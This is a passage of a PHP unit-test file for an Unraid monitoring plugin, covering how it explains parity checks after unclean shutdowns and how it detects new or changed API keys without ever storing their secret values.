    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
    $calls = function () use ($notified): array {
        $out = [];
        foreach (array_filter(explode("\n", (string) @file_get_contents($notified))) as $l) {
            $a = explode("\x1f", rtrim($l, "\x1f"));
            $o = [];
            for ($i = 0; $i + 1 < count($a); $i += 2) {
                $o[$a[$i]] = $a[$i + 1];
            }
            if (str_contains($o['-s'] ?? '', 'parity check')) {
                $out[] = $o;                // his notifications about parity checks (a new login or plugin of a fixture is told as well)
            }
        }
        return $out;
    };
    $entries = fn () => array_values(array_filter(watchmanLoad($day)['book'], fn ($e) => $e['kind'] === 'parity_check'));
    $parity = fn () => watchmanLoad($day)['state']['parity'] ?? null;
    $setBoot = function (string $id, int $btime) use ($tmp): void {
        file_put_contents("$tmp/boot_id", "$id\n");
        file_put_contents("$tmp/stat", "cpu  1 2 3\nbtime $btime\nprocesses 9\n");
    };
    $setVar = function (int $synced, int $synced2, string $action = 'check P', int $pos = 0, string $fs = 'Started') use ($paths): void {
        file_put_contents($paths['var_ini'], "fsState=\"$fs\"\nmdResyncAction=\"$action\"\nmdResyncPos=\"$pos\"\nmdResync=\"" . ($pos ? 5 : 0)
            . "\"\nsbSynced=\"$synced\"\nsbSynced2=\"$synced2\"\nsbSyncExit=\"0\"\nsbSyncErrs=\"0\"\nshutdownTimeout=\"90\"\n");
    };
    $bootLog = fn (int $up, bool $unclean, string $more = '') => $line($up + 20, 'emhttpd: Unraid(tm) System Management Utility version 7.3.3')
        . ($unclean ? $line($up + 20, 'emhttpd: unclean shutdown detected') : '') . $line($up + 40, 'kernel: mdcmd (35): start STOPPED') . $more;
    $A = 'aaaaaaaa-0000-4000-8000-00000000000a';
    $B = 'aaaaaaaa-0000-4000-8000-00000000000b';
    $C = 'aaaaaaaa-0000-4000-8000-00000000000c';
    $D = 'aaaaaaaa-0000-4000-8000-00000000000d';
    $E = 'aaaaaaaa-0000-4000-8000-00000000000e';
    $F = 'aaaaaaaa-0000-4000-8000-00000000000f';

    // hired in boot A with an old check behind: remembered, nothing written
    $t0 = $now - 86400 * 5;
    $setBoot($A, $t0 - 3600);
    $setVar($t0 - 86400, $t0 - 86000);
    file_put_contents($paths['syslog'], $bootLog($t0 - 3600, true));
    watchmanRound($paths, $day, 1000, $t0, $docker, true, $acks);
    same('parity: his first round — an old check and an old unclean stop only remembered, nobody told', [[], $t0 - 86400, [], null],
        [$entries(), $parity()['synced'] ?? null, $calls(), $parity()['todo'] ?? null]);

    // boot B, clean: the array started, no check — after PARITYWHY_SETTLE the verdict «clean», no line, no to-do. The stop
    // before ran out of time but still ended clean (the test server 09:11: a program in /mnt/disk1, btrfs — rc.6 killed it and the md
    // driver stopped): its diagnostics are there, Unraid found nothing unclean — nothing to say
    $up = $t0 + 3600;
    $setBoot($B, $up);
    copy($zipFile, "$src/logs/tower-diagnostics-20261005-1259.zip");
    touch("$src/logs/tower-diagnostics-20261005-1259.zip", $up - 60);
    file_put_contents($paths['syslog'], $bootLog($up, false));
    watchmanRound($paths, $day, 1000, $up + 120, $docker, true, $acks);
    same('parity: a clean boot — still waiting while the array runs less than PARITYWHY_SETTLE', [$A, []], [$parity()['verdict']['boot'] ?? null, $entries()]);
    watchmanRound($paths, $day, 1000, $up + 40 + PARITYWHY_SETTLE + 5, $docker, true, $acks);
    same('parity: a clean boot — the verdict, no line, no to-do, nobody told', [$B, false, [], null, [], null],
        [$parity()['verdict']['boot'] ?? null, $parity()['verdict']['unclean'] ?? null, $entries(), $parity()['todo'] ?? null, $calls(), watchmanParityFinding($day)]);

    // boot C, unclean: the shutdown's time-out ran out (its diagnostics), the check began with the array
    $up = $t0 + 86400;
    $setBoot($C, $up);
    $setVar($up + 42, 0, 'check P', 1024);
    file_put_contents($paths['syslog'], $bootLog($up, true, $line($up + 42, 'kernel: mdcmd (36): check ')));
    copy($zipFile, "$src/logs/tower-diagnostics-20261010-1149.zip");
    touch("$src/logs/tower-diagnostics-20261010-1149.zip", $up - 90);
    $res = watchmanRound($paths, $day, 1000, $up + 90, $docker, true, $acks);
    $e = $entries();
    same('parity: an unclean stop — one plain line, its reason with the stop and what held the array, noted by himself',
        [1, "parity_check:" . ($up + 42), 'unclean', 'timeout', 'diag', '/mnt/cache, /mnt/disk2, /mnt/big', 90, 1, false, 'parity', true, 'array', 'T1529', ['parity_check']],
        [count($e), $e[0]['key'] ?? null, $e[0]['p']['reason'] ?? null, $e[0]['p']['stop'] ?? null, $e[0]['p']['from'] ?? null, $e[0]['p']['held'] ?? null,
         $e[0]['p']['timeout'] ?? null, $e[0]['p']['streak'] ?? null, $e[0]['p']['kept'] ?? null, $e[0]['by'] ?? null, !empty($e[0]['noted']),
         WATCH_KINDS['parity_check'][0], WATCH_ATTACK['parity_check'], array_values(array_filter($res['added'], fn ($k) => $k === 'parity_check'))]);
    same('parity: its words (en, de)',
        ['Parity check after an unclean stop: at the last shutdown the array didn\'t stop within 90 s, and Unraid switched the server off anyway — held up by: /mnt/cache, /mnt/disk2, /mnt/big (as far as can be seen)',
         'Paritätsprüfung nach unsauberem Stopp: Beim letzten Herunterfahren hat das Array nicht in 90 s gestoppt, und Unraid hat den Server trotzdem ausgeschaltet — blockiert von: /mnt/cache, /mnt/disk2, /mnt/big (so weit erkennbar)'],
        [officeNotifyText('watchman', 'entry.parity_check', watchmanText($e[0], 'en'), 'en'), officeNotifyText('watchman', 'entry.parity_check', watchmanText($e[0], 'de'), 'de')]);
    $c = $calls();
    $m = str_replace('\n', "\n", (string) ($c[0]['-m'] ?? ''));
    same('parity: one notification, normal, to the team lead\'s page — headline, a blank line, sections with one item per line',
        [1, 'normal', 'Unraid Secretary Office: Night watchman: parity check after an unclean stop', 'The array didn\'t stop within 90 s at the last shutdown; Unraid is checking the parity now.',
         true, true, true, true, true],
        [count($c), $c[0]['-i'] ?? null, $c[0]['-s'] ?? null, $c[0]['-d'] ?? null, str_starts_with($m, "Parity check after an unclean stop\n\nWHAT HAPPENED\n  At the last shutdown"),
         str_contains($m, "\n\nHELD UP BY (AS FAR AS CAN BE SEEN)\n  /mnt/cache: still busy — a program had a file or folder open there (a terminal, a container Unraid doesn't manage, a script)\n  /mnt/disk2: still busy"),
         str_contains($m, "  Settings → Disk Settings → «Shutdown time-out» at least 100 s (now 90 s): Docker 10 s + VMs 60 s + 30 s for the disks\n"),
         str_contains($m, "So the reason shows next time"), str_ends_with((string) ($c[0]['-l'] ?? ''), '#/caretaker')]);
    $f = watchmanParityFinding($day);
    same('parity: the team lead\'s to-do with the numbers (recommended, into Disk Settings)',
        ['parity_unclean', 'recommended', false, 'disks', ['n' => 1, 'held' => '/mnt/cache, /mnt/disk2, /mnt/big', 'disk' => 90, 'need' => 100, 'docker' => 10, 'vm' => 60, 'margin' => 30]],
        [$f['id'] ?? null, $f['level'] ?? null, $f['ok'] ?? null, $f['link'] ?? null, $f['params'] ?? null]);
    same('parity: its words (de)', 'Der letzte Stopp war nicht sauber — Unraid prüft beim Start die Parität',
        officeNotifyText('caretaker', 'check.parity_unclean', $f['params'], 'de'));
    // the next rounds: nothing twice; the check done — its end into the line
    $setVar($up + 42, $up + 1500);
    watchmanRound($paths, $day, 1000, $up + 1800, $docker, true, $acks);
    $e = $entries();
    same('parity: the next round — no second line, nobody told again; the check\'s end written into its line', [1, 1, $up + 1500, 0, $up + 1500],
        [count($e), count($calls()), $e[0]['p']['end'] ?? null, $e[0]['p']['errors'] ?? null, $e[0]['last']]);

    // boot D, unclean again — no shutdown at all (the copy at shutdown on, nothing kept): a crash; two in a row
    $up = $t0 + 2 * 86400;
    $setBoot($D, $up);
    file_put_contents($paths['rsyslog_cfg'], "local_server=\"\"\nsyslog_flash=\"\"\nsyslog_shutdown=\"\"\nremote_server=\"\"\n");
    $setVar($up + 41, 0, 'check P', 512);
    file_put_contents($paths['syslog'], $bootLog($up, true));
    file_put_contents($paths['array_events'], ($up + 55) . " start\n");       // boot D's own array start: no «stopped and started again» of boot C
    watchmanRound($paths, $day, 1000, $up + 90, $docker, true, $acks);
    $e = $entries();
    $f = watchmanParityFinding($day);
    same('parity: two unclean stops in a row, the second a crash — counted, the team lead\'s point about power and crashes',
        [2, 'crash', 2, 'parity_crash', 2, 'ups', 2],
        [count($e), $e[1]['p']['stop'] ?? null, $e[1]['p']['streak'] ?? null, $f['id'] ?? null, $f['params']['n'] ?? null, $f['link'] ?? null, count($calls())]);
    same('parity: … in words (en)', 'Parity check after an unclean stop: the server went off without shutting down — a crash, a power cut or a hard reset (Unraid wrote nothing at the end) — 2 times in a row: the check starts over at every restart as long as the array doesn\'t stop cleanly',
        officeNotifyText('watchman', 'entry.parity_check', watchmanText($e[1], 'en'), 'en'));
    same('parity: the second notification says «in a row» and has no time-outs to raise', ['Unraid Secretary Office: Night watchman: parity check after an unclean stop, 2 in a row', false, true],
        [$calls()[1]['-s'] ?? null, str_contains((string) ($calls()[1]['-m'] ?? ''), 'Shutdown time-out'), str_contains((string) ($calls()[1]['-m'] ?? ''), 'UPS')]);
    // the array stopped and started again in boot D: that stop was clean — the to-do goes
    file_put_contents($paths['array_events'], ($up + 55) . " start\n" . ($up + 3000) . " stop\n" . ($up + 3100) . " start\n");
    $setVar($up + 41, $up + 900);
    watchmanRound($paths, $day, 1000, $up + 3200, $docker, true, $acks);
    same('parity: the array stopped and started again — that stop was clean: no to-do', [null, 'array', null],
        [$parity()['todo'] ?? null, $parity()['cleared']['by'] ?? null, watchmanParityFinding($day)]);

    // boot E: unclean, the syslog of then kept (syslog-previous) — the time-out ran out, a VM switched off hard
    $up = $t0 + 3 * 86400;
    $setBoot($E, $up);
    @unlink("$src/logs/tower-diagnostics-20261010-1149.zip");
    file_put_contents("$src/logs/syslog-previous", $line($up - 300, 'rc.local_shutdown: Waiting up to 90 seconds for graceful shutdown...')
        . $line($up - 290, 'rc.libvirt: Shutting down VM: Win11') . $line($up - 230, 'rc.libvirt: Forced shutting down VM: Win11')
        . $line($up - 200, 'umount: /mnt/disk1: target is busy.') . $line($up - 210, 'rc.local_shutdown: Forcing shutdown...'));
    touch("$src/logs/syslog-previous", $up - 200);
    $setVar($up + 43, 0, 'check P', 64);
    file_put_contents($paths['syslog'], $bootLog($up, true));
    file_put_contents($paths['array_events'], ($up + 55) . " start\n");       // this boot's own array start (event/started)
    watchmanRound($paths, $day, 1000, $up + 90, $docker, true, $acks);
    $e = $entries();
    same('parity: the kept syslog of then — the time-out, the busy disk, the VM switched off hard; a clean stop between: not «in a row»',
        ['timeout', 'previous', '/mnt/disk1, VM «Win11»', ['Win11'], 1, true],
        [$e[2]['p']['stop'] ?? null, $e[2]['p']['from'] ?? null, $e[2]['p']['held'] ?? null, $e[2]['p']['vms'] ?? null, $e[2]['p']['streak'] ?? null, $e[2]['p']['kept'] ?? null]);
    same('parity: the boot\'s own array start is no «stopped and started again» — the to-do stays', ['parity_unclean', 1],
        [watchmanParityFinding($day)['id'] ?? null, watchmanParityFinding($day)['params']['n'] ?? null]);
    check('parity: the notification names the VM switched off hard', str_contains((string) ($calls()[2]['-m'] ?? ''), 'VM «Win11»: didn\'t shut down within 60 s, switched off hard'));

    // boot F, clean: the to-do goes; later a check on schedule, one by hand (Parity Check Tuning saw it), one unknown, a rebuild
    $up = $t0 + 4 * 86400;
    $setBoot($F, $up);
    @unlink("$src/logs/syslog-previous");
    $setVar($up + 43 - 86400, $up + 900 - 86400);
    file_put_contents($paths['syslog'], $bootLog($up, false, $line($up + 300, 'webgui: Successful login user root from 192.168.20.10')));
    watchmanRound($paths, $day, 1000, $up + PARITYWHY_SETTLE + 100, $docker, true, $acks);
    same('parity: a clean boot after an unclean stop — the to-do goes, nobody told', [null, 'boot', 3, 3],
        [$parity()['todo'] ?? null, $parity()['cleared']['by'] ?? null, count($calls()), count($entries())]);
    $odd = $up + PARITYWHY_SETTLE + 400;
    $setVar($odd, 0, 'check P', 100);
    watchmanRound($paths, $day, 1000, $odd + 120, $docker, true, $acks);
    $e = $entries();
    same('parity: a check of no known reason — who was logged in then', ['unknown', 'Parity check, reason unknown: not after an unclean stop, not on schedule — Unraid doesn\'t note who starts one (Check on Main, or a script); logged in around then: root@192.168.20.10 (WebGUI)'],
        [$e[3]['p']['reason'] ?? null, officeNotifyText('watchman', 'entry.parity_check', watchmanText($e[3], 'en'), 'en')]);
    file_put_contents("$src/plugins/parity.check.tuning.plg", '<PLUGIN/>');
    file_put_contents("$src/pct/parity.check.tuning.progress", "type|date|time|x\nMANUAL|2026 Oct 13 10:00:00|" . ($odd + 1000) . "|x|\n");
    $setVar($odd + 1001, 0, 'check P', 100);
    watchmanRound($paths, $day, 1000, $odd + 1200, $docker, true, $acks);
    $setVar($odd + 2000, 0, 'recon P', 100);
    watchmanRound($paths, $day, 1000, $odd + 2100, $docker, true, $acks);
    $e = $entries();
    same('parity: by hand (Parity Check Tuning noted it), a rebuild (no check at all); nobody told for any of them', ['manual', 'rebuild', 3],
        [$e[4]['p']['reason'] ?? null, $e[5]['p']['reason'] ?? null, count($calls())]);
    $sched = mktime(3, 0, 12, (int) date('n', $up), 1, (int) date('Y', $up));
    $sched = $sched > $up ? $sched : mktime(3, 0, 12, (int) date('n', $up) + 1, 1, (int) date('Y', $up));
    $setVar($sched, 0, 'check P', 100);
    watchmanRound($paths, $day, 1000, $sched + 200, $docker, true, $acks);
    $e = $entries();
    same('parity: a check on Unraid\'s schedule', ['schedule', 'Parity check on schedule (Settings → Scheduler → Parity Check)'],
        [$e[6]['p']['reason'] ?? null, officeNotifyText('watchman', 'entry.parity_check', watchmanText($e[6], 'en'), 'en')]);
    same('parity: the plain line\'s words on his page exist in all five', true,
        (bool) array_product(array_map(fn ($l) => officeNotifyText('watchman', 'noted.parity', ['when' => 'x'], $l) !== 'noted.parity', ['en', 'de', 'it', 'fr', 'es'])));

    // the notify switch off: the verdict and the to-do, no notification; the night shift never looks
    $st = watchmanLoad($day)['state'];
    $st['notify'] = false;
    writeAtomic("$day/state.json", jsonEncode($st));
    $up = $t0 + 5 * 86400;
    $setBoot('aaaaaaaa-0000-4000-8000-000000000010', $up);
    $setVar($up + 41, 0, 'check P', 100);
    file_put_contents($paths['syslog'], $bootLog($up, true));
    watchmanRound($paths, $day, 1000, $up + 90, $docker, true, $acks);
    same('parity: his notify switch off — the line and the to-do, no notification', ['unclean', 'parity_crash', 3],
        [$entries()[7]['p']['reason'] ?? null, watchmanParityFinding($day)['id'] ?? null, count($calls())]);
    same('parity: the night shift has none of his parity paths (it never looks)', [],
        array_values(array_intersect(array_keys(watchmanNightPaths()), ['parity_log', 'parity_cron', 'pct_dir', 'boot_logs', 'domain_cfg', 'docker_cfg'])));
    $np = $paths;
    unset($np['parity_log']);
    same('parity: no parity paths, or the array not started — not looked at', [null, null],
        [paritywhyLook($np, null, 'x', $now, $now), (function () use ($paths, $setVar, $now) { $setVar(1, 1, 'check P', 0, 'Stopped'); return paritywhyLook($paths, null, 'x', $now, $now); })()]);
    // read only: the library runs no command and writes no file (the book and the state are his round's)
    $srcText = (string) file_get_contents(dirname(__DIR__) . '/agent/lib/paritywhy.php');
    same('parity: read only — no command, no file written by the library', [],
        array_values(array_filter(['run(', 'runAll(', 'exec(', 'proc_open(', 'popen(', 'writeAtomic(', 'file_put_contents(', 'unlink('], fn ($w) => str_contains($srcText, $w))));

    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
    @unlink(watchmanLockFile($day, 'book'));
    @unlink(watchmanLockFile($day, 'round'));
    hardeningRm($tmp);
    hardeningRm($logs);
}

/**
 * Unraid's API as a door (2026-10-07): the watchman reads the API's key files — only id, name, roles, permissions, never
 * the key's value — a new key or more rights for one is an important entry (T1098), a key revoked is normal by itself,
 * api.json's sandbox, extra origins and Unraid.net logins are doors; the first look after the update is his baseline;
 * an ADMIN key is a posture tip. The secret of a fixture key must never reach the book, the state, what he saw, the
 * page, the mirror (RAM and flash), the night shift's files, a notification or the SIEM line.
 */
function testWatchmanApiDoor(): void
{
    $now = strtotime('2026-10-07 15:00:00');
    $tmp = hardeningTmp('apidoor');
    $src = "$tmp/src";
    $day = "$tmp/data/watchman";
    $night = "$tmp/run/nightshift";
    foreach (['plugins', 'extra', 'ssh/root', 'keys', 'proc', 'flash', 'run'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    @mkdir("$tmp/flash", 0700, true);
    @mkdir("$tmp/run", 0700, true);
    $ram = "$tmp/run/watchman-mirror.json";
    $flashMirror = "$tmp/flash/watchman-mirror.json";
    $boot = 'cccccccc-0000-4000-8000-000000000001';
    file_put_contents("$tmp/boot_id", "$boot\n");
    file_put_contents("$tmp/stat", "cpu  1 2 3\nbtime " . ($now - 86400) . "\nprocesses 9\n");
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'etc_passwd' => "$src/passwd", 'boot_id' => "$tmp/boot_id", 'stat' => "$tmp/stat",
              'proc' => "$src/proc", 'ident' => "$src/ident.cfg", 'api_keys' => "$src/keys", 'api_cfg' => "$src/api.json", 'logger' => "$tmp/logger"];
    file_put_contents($paths['syslog'], '');
    file_put_contents($paths['ident'], "USE_SSH=\"yes\"\nPORTSSH=\"22\"\nUSE_UPNP=\"no\"\n");     // the doors are read with Unraid's identity (watchmanHostDoors())
    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp &\n");
    file_put_contents($paths['passwd'], "root:x:0:0:Console and webGui login account:/root:/bin/bash\n");
    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n");
    // stand-ins for Unraid's notify and logger: they write down what they were given
    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg("$tmp/notified") . "\necho >> " . escapeshellarg("$tmp/notified") . "\n");
    file_put_contents("$tmp/logger", "#!/bin/bash\nprintf '%s\\n' \"\$*\" >> " . escapeshellarg("$tmp/syslogged") . "\n");
    chmod("$tmp/notify", 0755);
    chmod("$tmp/logger", 0755);
    $envBefore = getenv('OFFICE_NOTIFY_BIN');
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
    $docker = fn () => [];
    $acks = "$tmp/acks.json";

    // the API's key files as its CLI writes them (sorted keys) — each with a made-up 64-hex value that must never leave them
    $secrets = [];
    $key = function (string $file, string $id, string $name, array $roles, array $perms, array $extra = []) use ($src, &$secrets): void {
        $secret = bin2hex(random_bytes(32));
        $secrets[] = $secret;
        $k = ['createdAt' => '2026-10-07T13:00:00.000Z', 'description' => "made for $name", 'id' => $id, 'key' => $secret, 'name' => $name,
              'permissions' => $perms, 'roles' => $roles] + $extra;
        ksort($k);
        file_put_contents("$src/keys/$file", json_encode($k, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    };
    $id1 = 'aaaaaaaa-1111-4111-8111-000000000001';
    $id2 = 'aaaaaaaa-2222-4222-8222-000000000002';
    $id3 = 'aaaaaaaa-3333-4333-8333-000000000003';
    $key("$id1.json", $id1, 'Home Assistant', ['viewer'], [['resource' => 'DOCKER', 'actions' => ['read']]], ['token' => 'tok-' . bin2hex(random_bytes(8))]);
    $secrets[] = json_decode((string) file_get_contents("$src/keys/$id1.json"), true)['token'];
    file_put_contents("$src/keys/notes.txt", 'not a key');
    file_put_contents("$src/keys/broken.json", '{"id": "../../x", "key": "' . bin2hex(random_bytes(32)) . '", "name": "x"}');
    $secrets[] = json_decode((string) file_get_contents("$src/keys/broken.json"), true)['key'];
    symlink("$src/keys/$id1.json", "$src/keys/link.json");
    $cfgSecret = 'cfg-' . bin2hex(random_bytes(12));
    $secrets[] = $cfgSecret;
    $apiCfg = fn (array $c) => file_put_contents($paths['api_cfg'], json_encode($c + ['version' => '4.37.5', 'plugins' => ['unraid-api-plugin-connect'], 'apiSecret' => $cfgSecret]));
    $apiCfg(['extraOrigins' => [], 'sandbox' => false, 'ssoSubIds' => []]);

    // one file, as little of it as says something
    $k1 = watchmanApiKeyRead("$src/keys/$id1.json");
    same('api key: id, name, roles in upper case, the permission as the API reads it, not all-powerful',
        [$id1, 'Home Assistant', ['VIEWER'], 1, ['DOCKER:READ_ANY'], false, ['id', 'name', 'roles', 'perm', 'perms', 'rights', 'full']],
        [$k1['id'] ?? null, $k1['name'] ?? null, $k1['roles'] ?? null, $k1['perms'] ?? null, $k1['rights'] ?? null, $k1['full'] ?? null, array_keys((array) $k1)]);
    same('api key: legacy actions normalised like the API, unknown ones dropped', ['READ_ANY', 'READ_OWN', 'UPDATE_ANY', 'DELETE_ANY', null, '*'],
        array_map('watchmanApiAction', ['read', 'read:own', 'UPDATE_ANY', 'delete', 'fly', '*']));
    same('api key: all-powerful — ADMIN, any resource (*), or the right to make or change keys and permissions', [true, true, true, true, false],
        [watchmanApiFull(['ADMIN'], []), watchmanApiFull([], ['*:READ_ANY']), watchmanApiFull([], ['API_KEY:CREATE_ANY']), watchmanApiFull([], ['PERMISSION:UPDATE_OWN']),
         watchmanApiFull(['VIEWER', 'CONNECT'], ['API_KEY:READ_ANY', 'DOCKER:UPDATE_ANY'])]);
    $look = watchmanApiKeys($paths, []);
    same('api keys: only key files in the API\'s shape; a link, a bad id, another file left out', [[$id1], ["$id1.json", 'broken.json']],
        [array_keys($look['keys']), array_keys($look['files'])]);
    $prev = $look['files'];
    $prev["$id1.json"]['k']['name'] = 'as the last round saw it';
    same('api keys: a file the same as the last round saw is not read again', 'as the last round saw it',
        watchmanApiKeys($paths, $prev)['keys'][$id1]['name'] ?? null);
    $prev["$id1.json"]['k']['id'] = '../x';
    same('api keys: a kept look not in its shape is read anew', 'Home Assistant', watchmanApiKeys($paths, $prev)['keys'][$id1]['name'] ?? null);
    same('api keys: no place, not looked at', null, watchmanApiKeys(array_diff_key($paths, ['api_keys' => 1]), []));
    same('api doors: the sandbox off, no Unraid.net logins; nothing else of the file', [['api_sandbox', 'api_sso'], [false, false]],
        [array_keys(watchmanApiDoors($paths['api_cfg'])), array_column(watchmanApiDoors($paths['api_cfg']), 'on')]);

    // hired: his first round knows the key and the API's settings
    $r = watchmanRound($paths, $day, 1000, $now, $docker, true, $acks);
    $b = watchmanLoad($day)['baseline'];
    same('api: the first round is the baseline', [true, [], [$id1], false],
        [$r['fresh'], $r['added'], array_keys((array) ($b['host']['api'] ?? [])), $b['host']['doors']['api_sandbox']['on'] ?? null]);
    watchmanSyslogSet(true, $day, false);

    // a new ADMIN key, more rights for the first, the sandbox on, another origin, an Unraid.net account
    $key("$id2.json", $id2, 'Remote tool', ['admin'], []);
    $key("$id1.json", $id1, 'Home Assistant', ['VIEWER'], [['resource' => 'DOCKER', 'actions' => ['READ_ANY', 'UPDATE_ANY']]]);
    $apiCfg(['extraOrigins' => ['https://ha.example.com:8123/some/path'], 'sandbox' => true, 'ssoSubIds' => ['sub-' . bin2hex(random_bytes(4))]]);
    $r = watchmanRound($paths, $day, 1000, $now + 300, $docker, true, $acks);
    $d = watchmanLoad($day);
    $open = array_column(array_values(array_filter($d['book'], 'watchmanOpen')), null, 'key');
    $kinds = $r['added'];
    sort($kinds);
    same('api: a new key, more rights for one, three doors opened', [['api_key_changed', 'api_key_new', 'door_new', 'door_new', 'door_new'],
        ["api_key_new:$id2", "api_key_changed:$id1", 'door_new:api_sandbox', 'door_new:api_origin:https://ha.example.com:8123', 'door_new:api_sso']],
        [$kinds, array_values(array_intersect(["api_key_new:$id2", "api_key_changed:$id1", 'door_new:api_sandbox', 'door_new:api_origin:https://ha.example.com:8123',
            'door_new:api_sso'], array_keys($open)))]);
    $new = $open["api_key_new:$id2"]['p'] ?? [];
    $chg = $open["api_key_changed:$id1"]['p'] ?? [];
    same('api: what the entries keep — name, roles, permissions, all-powerful; before', [['Remote tool', ['ADMIN'], 0, true], [2, 1, ['DOCKER:READ_ANY', 'DOCKER:UPDATE_ANY'], ['VIEWER']]],
        [[$new['name'] ?? null, $new['roles'] ?? null, $new['perms'] ?? null, $new['full'] ?? null], [$chg['perms'] ?? null, $chg['old_perms'] ?? null, $chg['rights'] ?? null, $chg['old_roles'] ?? null]]);
    same('api: group host, important, ATT&CK T1098', [['host', true], ['host', true], 'T1098', 'T1098'],
        [WATCH_KINDS['api_key_new'], WATCH_KINDS['api_key_changed'], WATCH_ATTACK['api_key_new'], WATCH_ATTACK['api_key_changed']]);
    same('api: in words', ['A new key for Unraid\'s API: Remote tool (roles: ADMIN; permissions: 0)',
        'A new way in from outside: Unraid\'s API answers web pages of https://ha.example.com:8123 too (with a logged-in browser\'s session)'],
        [officeNotifyText('watchman', 'entry.api_key_new', watchmanText($open["api_key_new:$id2"]), 'en'),
         officeNotifyText('watchman', 'entry.door_new', watchmanText($open['door_new:api_origin:https://ha.example.com:8123'], 'en'), 'en')]);
    $tips = array_column((array) ($d['state']['posture']['tips'] ?? []), null, 'id');
    same('api posture: a key that can do everything — advice, with Unraid\'s page for its keys', ['advice', 'Remote tool', 1, '/Settings/ManagementAccess'],
        [$tips['api_admin']['level'] ?? null, $tips['api_admin']['p']['names'] ?? null, $tips['api_admin']['p']['n'] ?? null, $tips['api_admin']['link']['path'] ?? null]);
    $checks = array_column(watchmanChecks($day), null, 'id');
    same('api: the team lead hears of both kinds and of the advice', ['recommended', 'recommended', 'hint'],
        [$checks['api_key_new']['level'] ?? null, $checks['api_key_changed']['level'] ?? null, $checks['posture']['level'] ?? null]);
    $syslogged = (string) @file_get_contents("$tmp/syslogged");
    check('api: the SIEM line carries the kind and the technique', str_contains($syslogged, '"kind":"api_key_new"') && str_contains($syslogged, '"attack":"T1098"'));
    check('api: told to Unraid\'s notifications', str_contains((string) @file_get_contents("$tmp/notified"), 'Remote tool'));
    $ps = watchmanPageState($day, $now + 300, false);
    same('api: «What I keep an eye on» — the keys he knows by name and roles', [[['name' => 'Home Assistant', 'roles' => ['VIEWER'], 'perms' => 1, 'full' => false]]],
        [$ps['watch']['host']['api'] ?? null]);

    // the mirror for the night shift (RAM and flash) — and the night: a key made while the array is stopped
    watchmanMirrorWrite($day, $ram, $flashMirror, $now + 300, $boot);
    $key("$id3.json", $id3, 'Night key', ['VIEWER'], []);
    $nr = watchmanNightRound($paths, $night, $now + 600, true, fn () => [], $ram, $flashMirror, $boot);
    $nopen = array_column(array_values(array_filter(watchmanLoad($night)['book'], 'watchmanOpen')), null, 'key');
    same('api night: the night shift sees a new key too (flash only)', [['hired' => 1000, 'from' => 'ram'], true], [$nr['begun'] ?? null, isset($nopen["api_key_new:$id3"])]);

    // nothing of a key's value (nor any other field of the files) anywhere
    $everything = $syslogged . (string) @file_get_contents("$tmp/notified") . json_encode($ps) . (string) @file_get_contents($ram) . (string) @file_get_contents($flashMirror);
    foreach ([$day, $night] as $dir) {
        foreach (glob("$dir/*") ?: [] as $f) {
            $everything .= (string) @file_get_contents($f);
        }
    }
    $everything .= json_encode(watchmanChecks($day)) . json_encode(watchmanApiKeys($paths, []));
    check('api: no key value, no other field of the files — book, state, seen, page, checks, mirror (RAM, flash), the night, notifications, SIEM',
        !array_filter($secrets, fn ($s) => str_contains($everything, $s)) && !str_contains($everything, 'made for ') && !str_contains($everything, 'createdAt')
        && !str_contains($everything, 'apiSecret'));
    check('api: the flash mirror — the known keys by name, open entries without their words', str_contains((string) file_get_contents($flashMirror), 'Remote tool') === false
        && str_contains((string) file_get_contents($flashMirror), 'Home Assistant') && str_contains((string) file_get_contents($flashMirror), "api_key_new:$id2"));
    hardeningRm($night);

    // «I know, thanks»: the new key is wanted; fewer roles, a rename — normal by themselves; revoked — safer; back — told again
    @unlink("$src/keys/$id3.json");
    watchmanAck($open["api_key_new:$id2"]['id'], $day, $now + 700, false);
    same('api: «I know, thanks» — the next round is quiet', [], watchmanRound($paths, $day, 1000, $now + 900, $docker, false, $acks)['added']);
    $key("$id2.json", $id2, 'Remote tool (renamed)', [], [['resource' => 'DOCKER', 'actions' => ['READ_ANY']]]);
    same('api: other permissions for a known key are told even with fewer roles (a fingerprint can\'t tell fewer)', ['api_key_changed'],
        watchmanRound($paths, $day, 1000, $now + 1200, $docker, false, $acks)['added']);
    watchmanAck('*', $day, $now + 1300, false);
    $key("$id2.json", $id2, 'Remote tool (renamed again)', [], [['resource' => 'DOCKER', 'actions' => ['READ_ANY']]]);
    same('api: renamed only — normal by itself', [[], 'Remote tool (renamed again)'],
        [watchmanRound($paths, $day, 1000, $now + 1500, $docker, false, $acks)['added'], watchmanLoad($day)['baseline']['host']['api'][$id2]['name'] ?? null]);
    $key("$id1.json", $id1, 'Home Assistant', [], [['resource' => 'DOCKER', 'actions' => ['READ_ANY', 'UPDATE_ANY']]]);
    same('api: a role taken away (the permissions the same) — safer, normal by itself', [[], []],
        [watchmanRound($paths, $day, 1000, $now + 1800, $docker, false, $acks)['added'], watchmanLoad($day)['baseline']['host']['api'][$id1]['roles'] ?? null]);
    same('api posture: no key can do everything any more — the advice is gone', false,
        in_array('api_admin', array_column((array) (watchmanLoad($day)['state']['posture']['tips'] ?? []), 'id'), true));
    rename("$src/keys/$id2.json", "$tmp/$id2.json");
    same('api: a key revoked — safer, gone from what he knows', [[], false],
        [watchmanRound($paths, $day, 1000, $now + 2100, $docker, false, $acks)['added'], isset(watchmanLoad($day)['baseline']['host']['api'][$id2])]);
    rename("$tmp/$id2.json", "$src/keys/$id2.json");
    same('api: back again — told again', ['api_key_new'], watchmanRound($paths, $day, 1000, $now + 2400, $docker, false, $acks)['added']);

    // a baseline of before this update: his first look at the API is normal — keys and the doors its settings open
    $d = watchmanLoad($day);
    $b = $d['baseline'];
    unset($b['host']['api']);
